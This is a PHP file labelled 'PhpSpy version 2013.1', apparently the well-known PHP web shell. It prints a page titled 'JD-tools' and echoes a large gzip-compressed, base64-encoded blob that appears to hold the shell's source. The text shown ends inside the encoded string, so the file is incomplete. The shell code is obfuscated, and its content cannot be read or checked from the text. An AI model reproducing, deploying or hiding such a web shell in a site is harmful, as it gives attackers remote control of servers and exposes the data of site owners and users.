<?php
/**
 * PhpSpy version 2013.1
 */
print <<< end_of_print
<!DOCTYPE HTML>
<HTML>
<HEAD>
<TITLE>JD-tools</TITLE>
<meta charset="gbk"/>
<meta http-equiv="pragma" content="no-cache" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" /> 
<meta name="viewport" content="width=1024, minimum-scale=0.3, maximum-scale=1.0" /> 
<meta name="format-detection" content="telephone=no" />
<link rel="stylesheet" href="http://yandex.st/highlightjs/8.0/styles/default.min.css">
<script src="http://yandex.st/highlightjs/8.0/highlight.min.js"></script>
<!-- script src="https://google-code-prettify.googlecode.com/svn/loader/run_prettify.js"></script -->
</HEAD>
<BODY>
end_of_print;
//echo '<pre class="prettyprint">';
echo '<pre><code>';
echo gzinflate(base64_decode('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